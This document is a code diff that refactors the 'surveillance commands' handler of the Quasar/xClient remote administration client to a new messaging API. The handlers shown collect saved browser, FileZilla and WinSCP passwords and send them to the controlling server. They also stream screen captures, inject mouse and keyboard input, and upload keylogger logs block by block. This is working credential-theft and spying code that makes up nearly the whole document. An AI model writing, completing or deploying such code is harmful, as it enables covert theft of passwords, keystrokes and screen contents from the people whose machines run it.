@@ -1,24 +1,28 @@
-﻿using System;
+﻿using Quasar.Common.Enums;
+using Quasar.Common.IO;
+using Quasar.Common.Messages;
+using Quasar.Common.Models;
+using Quasar.Common.Video;
+using Quasar.Common.Video.Codecs;
+using System;
+using System.Collections.Generic;
 using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
+using System.Threading;
 using System.Windows.Forms;
 using xClient.Core.Helper;
-using System.Drawing.Imaging;
-using System.Threading;
 using xClient.Core.Networking;
-using xClient.Core.Utilities;
-using xClient.Enums;
-using System.Collections.Generic;
-using xClient.Core.Data;
 using xClient.Core.Recovery.Browsers;
 using xClient.Core.Recovery.FtpClients;
+using xClient.Core.Utilities;
 
 namespace xClient.Core.Commands
 {
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE SURVEILLANCE COMMANDS. */
     public static partial class CommandHandler
     {
-        public static void HandleGetPasswords(Packets.ServerPackets.GetPasswords packet, Client client)
+        public static void HandleGetPasswords(GetPasswords packet, Client client)
         {
             List<RecoveredAccount> recovered = new List<RecoveredAccount>();
 
@@ -30,38 +34,32 @@ namespace xClient.Core.Commands
             recovered.AddRange(FileZilla.GetSavedPasswords());
             recovered.AddRange(WinSCP.GetSavedPasswords());
 
-            List<string> raw = new List<string>();
-
-            foreach (RecoveredAccount value in recovered)
-            {
-                string rawValue = string.Format("{0}{4}{1}{4}{2}{4}{3}", value.Username, value.Password, value.URL, value.Application, DELIMITER);
-                raw.Add(rawValue);
-            }
-
-            new Packets.ClientPackets.GetPasswordsResponse(raw).Execute(client);
+            client.Send(new GetPasswordsResponse {RecoveredAccounts = recovered});
         }
 
-        public static void HandleGetDesktop(Packets.ServerPackets.GetDesktop command, Client client)
+        public static void HandleGetDesktop(GetDesktop command, Client client)
         {
-            var resolution = FormatHelper.FormatScreenResolution(ScreenHelper.GetBounds(command.Monitor));
+            // TODO: Capture mouse in frames: https://stackoverflow.com/questions/6750056/how-to-capture-the-screen-and-mouse-pointer-using-windows-apis
+            var monitorBounds = ScreenHelper.GetBounds((command.DisplayIndex));
+            var resolution = new Resolution {Height = monitorBounds.Height, Width = monitorBounds.Width};
 
             if (StreamCodec == null)
-                StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);
+                StreamCodec = new UnsafeStreamCodec(command.Quality, command.DisplayIndex, resolution);
 
-            if (StreamCodec.ImageQuality != command.Quality || StreamCodec.Monitor != command.Monitor
+            if (command.CreateNew || StreamCodec.ImageQuality != command.Quality || StreamCodec.Monitor != command.DisplayIndex
                 || StreamCodec.Resolution != resolution)
             {
                 if (StreamCodec != null)
                     StreamCodec.Dispose();
 
-                StreamCodec = new UnsafeStreamCodec(command.Quality, command.Monitor, resolution);
+                StreamCodec = new UnsafeStreamCodec(command.Quality, command.DisplayIndex, resolution);
             }
 
             BitmapData desktopData = null;
             Bitmap desktop = null;
             try
             {
-                desktop = ScreenHelper.CaptureScreen(command.Monitor);
+                desktop = ScreenHelper.CaptureScreen(command.DisplayIndex);
                 desktopData = desktop.LockBits(new Rectangle(0, 0, desktop.Width, desktop.Height),
                     ImageLockMode.ReadWrite, desktop.PixelFormat);
 
@@ -72,15 +70,27 @@ namespace xClient.Core.Commands
                         new Rectangle(0, 0, desktop.Width, desktop.Height),
                         new Size(desktop.Width, desktop.Height),
                         desktop.PixelFormat, stream);
-                    new Packets.ClientPackets.GetDesktopResponse(stream.ToArray(), StreamCodec.ImageQuality,
-                        StreamCodec.Monitor, StreamCodec.Resolution).Execute(client);
+                    client.Send(new GetDesktopResponse
+                    {
+                        Image = stream.ToArray(),
+                        Quality = StreamCodec.ImageQuality,
+                        Monitor = StreamCodec.Monitor,
+                        Resolution = StreamCodec.Resolution
+                    });
                 }
             }
             catch (Exception)
             {
                 if (StreamCodec != null)
-                    new Packets.ClientPackets.GetDesktopResponse(null, StreamCodec.ImageQuality, StreamCodec.Monitor,
-                        StreamCodec.Resolution).Execute(client);
+                {
+                    client.Send(new GetDesktopResponse
+                    {
+                        Image = null,
+                        Quality = StreamCodec.ImageQuality,
+                        Monitor = StreamCodec.Monitor,
+                        Resolution = StreamCodec.Resolution
+                    });
+                }
 
                 StreamCodec = null;
             }
@@ -103,7 +113,7 @@ namespace xClient.Core.Commands
             }
         }
 
-        public static void HandleDoMouseEvent(Packets.ServerPackets.DoMouseEvent command, Client client)
+        public static void HandleDoMouseEvent(DoMouseEvent command, Client client)
         {
             try
             {
@@ -151,7 +161,7 @@ namespace xClient.Core.Commands
             }
         }
 
-        public static void HandleDoKeyboardEvent(Packets.ServerPackets.DoKeyboardEvent command, Client client)
+        public static void HandleDoKeyboardEvent(DoKeyboardEvent command, Client client)
         {
             if (NativeMethodsHelper.IsScreensaverActive())
                 NativeMethodsHelper.DisableScreensaver();
@@ -159,15 +169,15 @@ namespace xClient.Core.Commands
             NativeMethodsHelper.DoKeyPress(command.Key, command.KeyDown);
         }
 
-        public static void HandleGetMonitors(Packets.ServerPackets.GetMonitors command, Client client)
+        public static void HandleGetMonitors(GetMonitors command, Client client)
         {
             if (Screen.AllScreens.Length > 0)
             {
-                new Packets.ClientPackets.GetMonitorsResponse(Screen.AllScreens.Length).Execute(client);
+                client.Send(new GetMonitorsResponse {Number = Screen.AllScreens.Length});
             }
         }
 
-        public static void HandleGetKeyloggerLogs(Packets.ServerPackets.GetKeyloggerLogs command, Client client)
+        public static void HandleGetKeyloggerLogs(GetKeyloggerLogs command, Client client)
         {
             new Thread(() =>
             {
@@ -177,7 +187,16 @@ namespace xClient.Core.Commands
 
                     if (!Directory.Exists(Keylogger.LogDirectory))
                     {
-                        new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
+                        client.Send(new GetKeyloggerLogsResponse
+                        {
+                            Filename = "",
+                            Block = new byte[0],
+                            MaxBlocks = -1,
+                            CurrentBlock = -1,
+                            CustomMessage = "",
+                            Index = index,
+                            FileCount = 0
+                        });
                         return;
                     }
 
@@ -185,7 +204,16 @@ namespace xClient.Core.Commands
 
                     if (iFiles.Length == 0)
                     {
-                        new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, "", index, 0).Execute(client);
+                        client.Send(new GetKeyloggerLogsResponse
+                        {
+                            Filename = "",
+                            Block = new byte[0],
+                            MaxBlocks = -1,
+                            CurrentBlock = -1,
+                            CustomMessage = "",
+                            Index = index,
+                            FileCount = 0
+                        });
                         return;
                     }
 
@@ -194,18 +222,49 @@ namespace xClient.Core.Commands
                         FileSplit srcFile = new FileSplit(file.FullName);
 
                         if (srcFile.MaxBlocks < 0)
-                            new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);
+                        {
+                            client.Send(new GetKeyloggerLogsResponse
+                            {
+                                Filename = "",
+                                Block = new byte[0],
+                                MaxBlocks = -1,
+                                CurrentBlock = -1,
+                                CustomMessage = srcFile.LastError,
+                                Index = index,
+                                FileCount = iFiles.Length
+                            });
+                        }
 
                         for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
                         {
                             byte[] block;
                             if (srcFile.ReadBlock(currentBlock, out block))
                             {
-                                new Packets.ClientPackets.GetKeyloggerLogsResponse(Path.GetFileName(file.Name), block, srcFile.MaxBlocks, currentBlock, srcFile.LastError, index, iFiles.Length).Execute(client);
+                                client.Send(new GetKeyloggerLogsResponse
+                                {
+                                    Filename = Path.GetFileName(file.Name),
+                                    Block = block,
+                                    MaxBlocks = srcFile.MaxBlocks,
+                                    CurrentBlock = currentBlock,
+                                    CustomMessage = srcFile.LastError,
+                                    Index = index,
+                                    FileCount = iFiles.Length
+                                });
                                 //Thread.Sleep(200);
                             }
                             else
-                                new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);
+                            {
+                                client.Send(new GetKeyloggerLogsResponse
+                                {
+                                    Filename = "",
+                                    Block = new byte[0],
+                                    MaxBlocks = -1,
+                                    CurrentBlock = -1,
+                                    CustomMessage = srcFile.LastError,
+                                    Index = index,
+                                    FileCount = iFiles.Length
+                                });
+                            }
                         }
 
                         index++;
@@ -213,7 +272,16 @@ namespace xClient.Core.Commands
                 }
                 catch (Exception ex)
                 {
-                    new Packets.ClientPackets.GetKeyloggerLogsResponse("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(client);
+                    client.Send(new GetKeyloggerLogsResponse
+                    {
+                        Filename = "",
+                        Block = new byte[0],
+                        MaxBlocks = -1,
+                        CurrentBlock = -1,
+                        CustomMessage = ex.Message,
+                        Index = -1,
+                        FileCount = -1
+                    });
                 }
             }).Start();
         }
